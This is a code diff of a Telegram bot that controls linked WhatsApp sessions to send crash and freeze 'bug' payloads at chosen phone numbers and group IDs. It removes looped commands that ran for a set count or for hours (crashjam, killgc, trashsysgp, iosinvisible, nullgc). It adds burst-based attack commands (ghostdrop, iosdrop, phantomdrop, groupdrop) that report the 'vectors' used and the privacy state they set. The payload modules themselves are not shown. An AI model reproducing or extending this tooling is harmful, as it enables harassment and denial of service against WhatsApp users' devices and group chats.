-                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
-
-                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget}`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
-
-                const delayMs = 2000;
-
-                if (args[2] === 'only') {
-                    const count = parseInt(args[3]);
-                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
-                    
-                    for (let i = 0; i < count; i++) {
-                        await crashjamLogic.crashjam(client, targetJid);
-                        await new Promise(res => setTimeout(res, delayMs));
-                    }
-                } else {
-                    const hours = parseInt(args[2]);
-                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
-                    
-                    const endTime = Date.now() + hours * 60 * 60 * 1000;
-                    while (Date.now() < endTime) {
-                        await crashjamLogic.crashjam(client, targetJid);
-                        await new Promise(res => setTimeout(res, delayMs));
-                    }
-                }
-            } catch (err) {
-                log('error', s7CM, err.message);
-                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
-            }
-        });
-
-        // ==================== NEW GROUP BUG COMMANDS FROM YOUR SCRIPT ====================
-
-        SYLoVe(['killgc', 'groupfriz'], async (msg) => {
-            try {
-                const chatId = msg.chat.id.toString();
-                const userId = msg.from.id.toString();
-                const args = msg.text.split(' ');
-                const s7CM = args[0].slice(1);
-                const targetNum = args[1];
-                const durationArg = args[2];
-
-                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
-                const session = GetSessionForUser(userId, chatId);
-                if (session.error) return S7.sendMessage(chatId, session.error);
-                const client = session.sock;
-
-                if (!targetNum || !targetNum.endsWith('@g.us')) {
-                    return S7.sendMessage(chatId, `❌ Provide a valid group JID.\nExample: /${s7CM} 123456@g.us 1`);
-                }
-                
-                if (!durationArg) {
-                    return S7.sendMessage(chatId, `❌ Provide duration in hours.\nExample: /${s7CM} 123456@g.us 1`);
-                }
-                
-                const hours = parseInt(durationArg);
-                if (isNaN(hours) || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid duration');
-
-                const targetJid = targetNum.trim();
-
-                log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours}h`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });
-
-                const delayMs = 2000;
-                const endTime = Date.now() + hours * 60 * 60 * 1000;
-
-                while (Date.now() < endTime) {
-                    await gcFrzLogic.gcFrz(client, targetJid);
-                    await new Promise(res => setTimeout(res, delayMs));
-                }
-
-            } catch (err) {
-                log('error', s7CM, err.message);
-                await S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
-            }
-        });
-
-        SYLoVe('trashsysgp', async (msg) => {
-            try {
-                const chatId = msg.chat.id.toString();
-                const userId = msg.from.id.toString();
-                const args = msg.text.split(' ');
-                const s7CM = args[0].slice(1);
-                const targetNum = args[1];
-                const durationArg = args[2];
-
-                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
-                const session = GetSessionForUser(userId, chatId);
-                if (session.error) return S7.sendMessage(chatId, session.error);
-                const client = session.sock;
-
-                if (!targetNum || !targetNum.endsWith('@g.us')) {
-                    return S7.sendMessage(chatId, `❌ Provide a valid group JID.\nExample: /${s7CM} 123456@g.us 1`);
-                }
-                
-                if (!durationArg) {
-                    return S7.sendMessage(chatId, `❌ Provide duration in hours.\nExample: /${s7CM} 123456@g.us 1`);
-                }
-                
-                const hours = parseInt(durationArg);
-                if (isNaN(hours) || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid duration');
-
-                const targetJid = targetNum.trim();
-
-                log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours}h`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });
-
-                const delayMs = 2000;
-                const endTime = Date.now() + hours * 60 * 60 * 1000;
-
-                while (Date.now() < endTime) {
-                    await killsystemLogic.killsystem(client, targetJid);
-                    await gcFrzLogic.gcFrz(client, targetJid);
-                    await new Promise(res => setTimeout(res, delayMs));
-                }
-
-            } catch (err) {
-                log('error', s7CM, err.message);
-                await S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
-            }
-        });
-
-        // ==================== EXISTING iOS BUG COMMANDS ====================
-
-        SYLoVe(['iosinvisible', 'iosvisible'], async (msg) => {
+        // /ghostdrop [num]
+        SYLoVe(['ghostdrop', 'gdrop', 'ghost'], async (msg) => {
             const chatId = msg.chat.id.toString();
             const userId = msg.from.id.toString();
             const args = msg.text.split(' ');
             const cmd = args[0].slice(1);
+            const targetNum = args[1];
 
             if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
             const session = GetSessionForUser(userId, chatId);
             if (session.error) return S7.sendMessage(chatId, session.error);
             const client = session.sock;
 
-            if (args.length < 3) {
-                return S7.sendMessage(chatId, `❌ Usage: /${cmd} +234XXXXXXX 1`);
-            }
+            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /${cmd} +923XXXXXXXXX`);
 
-            const cleanTarget = args[1].replace(/[^0-9]/g, '');
+            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
             const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
             try {
                 const [exists] = await client.onWhatsApp(targetJid);
                 if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
 
-                log('command', msg.from.first_name, `Calling ${cmd} on ${cleanTarget}`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
+                log('command', msg.from.first_name, `${cmd} → ${cleanTarget}`);
+                await S7.sendPhoto(chatId, LoveLogo, {
+                    caption: bvgNotice(cleanTarget, session.num, 'invisible · no-time'),
+                    parse_mode: 'HTML'
+                });
 
-                const delayFn = ms => new Promise(res => setTimeout(res, ms));
+                const report = await ghostdropLogic.ghostDrop(client, targetJid, {
+                    bursts: 3, gapMs: 500, useLid: true,
+                });
 
-                if (args[2] === 'only') {
-                    const count = parseInt(args[3]);
-                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
-                    for (let i = 0; i < count; i++) {
-                        await IosLogic.IosInvisible(client, targetJid);
-                        await delayFn(500);
-                    }
-                } else {
-                    const hours = parseInt(args[2]);
-                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
-                    const endTime = Date.now() + hours * 60 * 60 * 1000;
-                    while (Date.now() < endTime) {
-                        await IosLogic.IosInvisible(client, targetJid);
-                        await delayFn(500);
-                    }
-                }
+                const summary = Object.entries(report.channels)
+                    .map(([k, v]) => `${k}:${v}`)
+                    .join(' · ');
+
+                S7.sendMessage(chatId,
+                    `✅ <b>GHOSTDROP DONE</b>\n` +
+                    `Target: <code>${cleanTarget}</code>\n` +
+                    `Bursts: <b>${report.bursts}</b>\n` +
+                    `Channels: <code>${summary}</code>`,
+                    { parse_mode: 'HTML' }
+                );
             } catch (err) {
                 log('error', cmd, err.message);
-                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
+                S7.sendMessage(chatId, `❌ ${err.message}`);
             }
         });
 
-        SYLoVe('hidenseek', async (msg) => {
+        // ============================================================
+        // NEW IOS BUG COMMANDS
+        // ============================================================
+
+        // /iosdrop [num]
+        SYLoVe(['iosdrop', 'idrop', 'ioskill'], async (msg) => {
             const chatId = msg.chat.id.toString();
             const userId = msg.from.id.toString();
             const args = msg.text.split(' ');
+            const cmd = args[0].slice(1);
+            const targetNum = args[1];
 
             if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
             const session = GetSessionForUser(userId, chatId);
             if (session.error) return S7.sendMessage(chatId, session.error);
             const client = session.sock;
 
-            if (args.length < 3) {
-                return S7.sendMessage(chatId, `❌ Usage: /hidenseek +234XXXXXXX 1`);
-            }
+            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /${cmd} +923XXXXXXXXX`);
 
-            const cleanTarget = args[1].replace(/[^0-9]/g, '');
+            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
             const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
             try {
                 const [exists] = await client.onWhatsApp(targetJid);
                 if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
 
-                log('command', msg.from.first_name, `Calling hidenseek on ${cleanTarget}`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
+                log('command', msg.from.first_name, `${cmd} → ${cleanTarget}`);
+                await S7.sendPhoto(chatId, LoveLogo, {
+                    caption: bvgNotice(cleanTarget, session.num, 'ios-drop · no-time'),
+                    parse_mode: 'HTML'
+                });
 
-                const delayFn = ms => new Promise(res => setTimeout(res, ms));
+                const report = await iosdropLogic.iosDrop(client, targetJid, {
+                    bursts: 3, gapMs: 800, useLid: true,
+                });
 
-                if (args[2] === 'only') {
-                    const count = parseInt(args[3]);
-                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
-                    for (let i = 0; i < count; i++) {
-                        await IosLogic.IosInvisible(client, targetJid);
-                        await delayFn(500);
-                    }
-                } else {
-                    const hours = parseInt(args[2]);
-                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
-                    const endTime = Date.now() + hours * 60 * 60 * 1000;
-                    while (Date.now() < endTime) {
-                        await IosLogic.IosInvisible(client, targetJid);
-                        await delayFn(500);
-                    }
-                }
+                const summary = Object.entries(report.vectors)
+                    .map(([k, v]) => `${k}:${v}`)
+                    .join(' · ');
+
+                S7.sendMessage(chatId,
+                    `✅ <b>IOSDROP DONE</b>\n` +
+                    `Target: <code>${cleanTarget}</code>\n` +
+                    `Bursts: <b>${report.bursts}</b>\n` +
+                    `Vectors: <code>${summary}</code>`,
+                    { parse_mode: 'HTML' }
+                );
             } catch (err) {
-                log('error', 'hidenseek', err.message);
-                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
+                log('error', cmd, err.message);
+                S7.sendMessage(chatId, `❌ ${err.message}`);
             }
         });
 
-        // ==================== EXISTING GROUP BUG COMMANDS ====================
+        // /phantomdrop [num]
+        SYLoVe(['phantomdrop', 'pd', 'phantom'], async (msg) => {
+            const chatId = msg.chat.id.toString();
+            const userId = msg.from.id.toString();
+            const args = msg.text.split(' ');
+            const cmd = args[0].slice(1);
+            const targetNum = args[1];
 
-        SYLoVe(['nullgc', 'xgroup', 'groupfinity', 'autoclosegc', 'groupui', 'groupmix', 'forcegroup'], async (msg) => {
+            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
+            const session = GetSessionForUser(userId, chatId);
+            if (session.error) return S7.sendMessage(chatId, session.error);
+            const client = session.sock;
+
+            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /${cmd} +923XXXXXXXXX`);
+
+            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
+            const targetJid = `${cleanTarget}@s.whatsapp.net`;
+
             try {
-                const chatId = msg.chat.id.toString();
-                const userId = msg.from.id.toString();
-                const args = msg.text.split(' ');
-                const cmd = args[0].slice(1);
-                const targetJid = args[1];
-                const durationArg = args[2];
+                const [exists] = await client.onWhatsApp(targetJid);
+                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
 
-                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
+                log('command', msg.from.first_name, `${cmd} → ${cleanTarget}`);
+                await S7.sendPhoto(chatId, LoveLogo, {
+                    caption: bvgNotice(cleanTarget, session.num, 'phantom · no-time'),
+                    parse_mode: 'HTML'
+                });
 
-                const session = GetSessionForUser(userId, chatId);
-                if (session.error) return S7.sendMessage(chatId, session.error);
-                const client = session.sock;
+                const report = await phantomdropLogic.phantomDrop(client, targetJid, {
+                    bursts: 3, gapMs: 700, arm: true, useLid: true,
+                });
 
-                if (!targetJid || !targetJid.endsWith('@g.us')) {
-                    return S7.sendMessage(chatId, `❌ Provide a valid group JID.\nExample: /${cmd} 123456@g.us 1`);
-                }
-                if (!durationArg) {
-                    return S7.sendMessage(chatId, `❌ Provide duration in hours.\nExample: /${cmd} 123456@g.us 1`);
-                }
-                const hours = parseInt(durationArg);
-                if (isNaN(hours) || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid duration');
+                const summary = Object.entries(report.vectors)
+                    .map(([k, v]) => `${k}:${v}`)
+                    .join(' · ');
 
-                log('command', msg.from.first_name, `Calling ${cmd} on ${targetJid} for ${hours}h`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });
-
-                const delayFn = ms => new Promise(res => setTimeout(res, ms));
-                const endTime = Date.now() + hours * 60 * 60 * 1000;
-
-                while (Date.now() < endTime) {
-                    await XgcLogic.Xgc(client, targetJid);
-                    await delayFn(2000);
-                }
+                S7.sendMessage(chatId,
+                    `✅ <b>PHANTOMDROP DONE</b>\n` +
+                    `Target: <code>${cleanTarget}</code>\n` +
+                    `Bursts: <b>${report.bursts}</b>\n` +
+                    `Privacy: <b>${report.privacyArmed}/7</b>\n` +
+                    `Disappearing: <b>${report.disappearing ? 'ON (1s)' : 'OFF'}</b>\n` +
+                    `Vectors: <code>${summary}</code>`,
+                    { parse_mode: 'HTML' }
+                );
             } catch (err) {
-                log('error', 'groupcmds', err.message);
-                S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
+                log('error', cmd, err.message);
+                S7.sendMessage(chatId, `❌ ${err.message}`);
             }
         });
+
+        // ============================================================
+        // NEW GROUP BUG COMMAND
+        // ============================================================
+
+        // /groupdrop [group_id]@g.us
+        SYLoVe(['groupdrop', 'gdropg', 'dropgroup'], async (msg) => {
+            const chatId = msg.chat.id.toString();
+            const userId = msg.from.id.toString();
+            const args = msg.text.split(' ');
+            const cmd = args[0].slice(1);
+            const targetJid = args[1];
+
+            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
+            const session = GetSessionForUser(userId, chatId);
+            if (session.error) return S7.sendMessage(chatId, session.error);
+            const client = session.sock;
+
+            if (!targetJid || !targetJid.endsWith('@g.us')) {
+                return S7.sendMessage(chatId,
+                    `❌ Usage: /${cmd} <group_id>@g.us\n` +
+                    `Example: /${cmd} 1234567890-1234567890@g.us`,
+                    { parse_mode: 'HTML' }
+                );
+            }
+
+            try {
+                log('command', msg.from.first_name, `${cmd} → ${targetJid}`);
+
+                await S7.sendPhoto(chatId, LoveLogo, {
+                    caption: bvgNotice(targetJid, session.num, 'group · fan-out'),
+                    parse_mode: 'HTML'
+                });
+
+                const report = await groupdropLogic.groupDrop(client, targetJid, {
+                    bursts: 3,
+                    gapMs: 700,
+                    arm: true,
+                });
+
+                const summary = Object.entries(report.vectors)
+                    .map(([k, v]) => `${k}:${v}`)
+                    .join(' · ');
+
+                S7.sendMessage(chatId,
+                    `✅ <b>GROUPDROP DONE</b>\n` +
+                    `Target: <code>${targetJid}</code>\n` +
+                    `Admin rights: <b>${report.isAdmin ? 'YES' : 'NO'}</b>\n` +
+                    `Privacy: <b>${report.privacyArmed}/7</b>\n` +
+                    `Disappearing: <b>${report.disappearing ? 'ON' : 'OFF'}</b>\n` +
+                    `Bursts: <b>${report.bursts}</b>\n` +
+                    `Vectors: <code>${summary}</code>`,
+                    { parse_mode: 'HTML' }
+                );
+            } catch (err) {
+                log('error', cmd, err.message);
+                S7.sendMessage(chatId, `❌ ${err.message}`);
+            }
+        });
+
+        // ============================================================
+        // GROUP UTILITIES
+        // ============================================================
 
         SYLoVe('listgc', async (msg) => {
             const chatId = msg.chat.id.toString();
             const userId = msg.from.id.toString();
 
-            if (!LoveGlobalState(userId)) {
-                return sendSYLove(S7, chatId);
-            }
+            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
 
             if (!waSessions || Object.keys(waSessions).length === 0) {
                 return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
@@ -1235,7 +888,6 @@ function startSYloveBot(token) {
                     try {
                         const groupsObj = await sock.groupFetchAllParticipating();
                         const groups = Object.values(groupsObj);
-
                         if (groups.length === 0) continue;
 
                         text += `📱 <b>Number:</b> <code>${num}</code>\n`;
@@ -1243,13 +895,11 @@ function startSYloveBot(token) {
 
                         for (const group of groups) {
                             const meta = await sock.groupMetadata(group.id);
-
                             text += `❏ Group ${index++}\n`;
                             text += `│⭔ <b>Name:</b> ${meta.subject}\n`;
                             text += `│⭔ <b>ID:</b> <code>${meta.id}</code>\n`;
                             text += `│⭔ <b>Members:</b> ${meta.participants.length}\n`;
                             text += `╰──────────────\n\n`;
-
                             totalGroups++;
                         }
                     } catch (err) {
@@ -1262,10 +912,7 @@ function startSYloveBot(token) {
                 return S7.sendMessage(chatId, '❌ No groups found on connected numbers.');
             }
 
-            text =
-                `⬣ <b>LIST OF GROUP BELOW</b>\n\n` +
-                `📦 <b>Total Groups:</b> ${totalGroups}\n\n` +
-                text;
+            text = `⬣ <b>LIST OF GROUP BELOW</b>\n\n` + `📦 <b>Total Groups:</b> ${totalGroups}\n\n` + text;
 
             if (text.length > 4000) {
                 const filePath = './Love/listgc.txt';
@@ -1283,7 +930,6 @@ function startSYloveBot(token) {
             const link = args[1];
 
             if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
             const session = GetSessionForUser(userId, chatId);
             if (session.error) return S7.sendMessage(chatId, session.error);
             const client = session.sock;
@@ -1296,7 +942,7 @@ function startSYloveBot(token) {
                 const code = link.split('chat.whatsapp.com/')[1].trim();
                 await S7.sendMessage(chatId, '🔍 <b>Scanning Link...</b>', { parse_mode: 'HTML' });
                 const groupInfo = await client.groupGetInviteInfo(code);
-                const text = 
+                const text =
                     `🆔 <b>GROUP ID FOUND</b>\n` +
                     `────────────────────\n` +
                     `📌 <b>Name:</b> ${groupInfo.subject}\n` +
@@ -1312,7 +958,7 @@ function startSYloveBot(token) {
             }
         });
 
-        // ==================== EXISTING MISC COMMANDS ====================
+        // ==================== MISC COMMANDS ====================
 
         SYLoVe('addtoken', async (msg) => {
             const chatId = msg.chat.id.toString();
@@ -1591,4 +1237,4 @@ if (db.tokens && db.tokens.length > 0) {
     db.tokens.forEach(obj => startSYloveBot(obj.token));
 } else {
     log('info', null, 'No extra bots found in database.');
-                                     }
+                    }
